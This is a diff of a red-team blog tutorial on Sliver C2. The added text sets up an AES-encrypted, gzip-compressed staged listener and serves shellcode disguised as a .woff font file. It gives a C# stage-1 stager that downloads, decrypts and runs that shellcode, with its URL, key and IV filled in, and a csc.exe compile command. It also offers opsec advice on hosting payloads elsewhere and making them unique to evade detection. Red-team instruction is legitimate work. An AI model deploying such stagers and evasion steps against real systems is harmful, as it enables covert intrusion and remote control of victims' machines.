@@ -110,10 +110,32 @@ Type `profiles and you should see your 'https-win' profile created.
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/20dd9587-79df-40c7-bb91-dd7c7bd8aee2)
 
 Next, we need to create a staged listener that links to our profile. In this case, I obfuscated the staged payload using gzip compression and AES encryption. <br />
-`stage-listener --url http://sliver-domain:80 --profile https-win --compress gzip --aes-encrypt-key "1234567890123456" --aes-encrypt-iv "SomeRandomIVHere"`
+`stage-listener --url http://sliver-domain:80 --profile https-win --compress gzip --aes-encrypt-key "LgUmeMnmUpRrCBRB" --aes-encrypt-iv "nStxRW5o6TNHcKBx"`
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/ae2aa7e6-9e9d-4812-8d53-681651c30608)
 
-**Note:** *If you're using your Sliver C2 server to host the stage 1 payload, you need to set it up on a different protocol/port as your HTTPS listener. Alternatively, you can set it up, download the shellcode then host it anywhere else for better opsec (i.e. a cloud provider).*
+**Note:** *If you're using your Sliver C2 server to host the stage 1 payload, you need to set it up on a different protocol/port as your HTTPS listener. Alternatively, you can set it up, download the shellcode then host it anywhere else for better opsec (i.e. a cloud provider). If you host it elsewhere, don't forget to kill your original staged listener!*
 
-Beacon received from staged listener payload:
+Once you create the staged listener, your stage 2 payload should be available at [http://sliver-domain:80/AnythingHere.woff](http://sliver-domain:80/AnythingHere.woff). Note the ".woff" extension to download your shellcode. This is due to the "stager_file_extension" in your Sliver config ([reference](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#implant_config)). You could change this to any other extension you like in the config.<br />
+
+Now, we need to create a stage 1 payload to reach out to download and decrypt/decode our stage 2 payload then execute it. This should be as custom as possible for a red team, but a good starting point is the provided C# template [here in the Sliver documentation](https://github.com/BishopFox/sliver/wiki/Stagers#encrypted-stage-example) (note for this payload you'll have to add gzip compression if you chose that option in your `stage-listener` command).
+
+For the stadnard template, update the C# payloads variables to fit your url, AES key, and AES IV at the top of the script. 
+```
+...
+namespace Sliver_stager
+{
+    class Program
+    {
+        private static string AESKey = "LgUmeMnmUpRrCBRB";
+        private static string AESIV = "nStxRW5o6TNHcKBx";
+        private static string url = "http://sliver-domain:80/text-fonts.woff";
+        ...
+```
+Compile the C# payload with csc.exe in to an EXE for testing purposes: `C:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /out:Sliver-payload.exe Sliver_staged-payload.cs`
+
+Run the output payload `./Sliver-payload.exe` and you should see a new beacon pop up in Sliver!
 ![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/12d8f0df-a5d2-440f-972f-cd091a38b738)
+
+Of course for a red team, we want to further customize the stage 1 payload to make it as unique and opsec-safe as possible. We aren't going to cover that here as this is just a proof-of-concept, but get as creative as possible!
+<br />
+Hope you all enjoyed the Sliver setup!
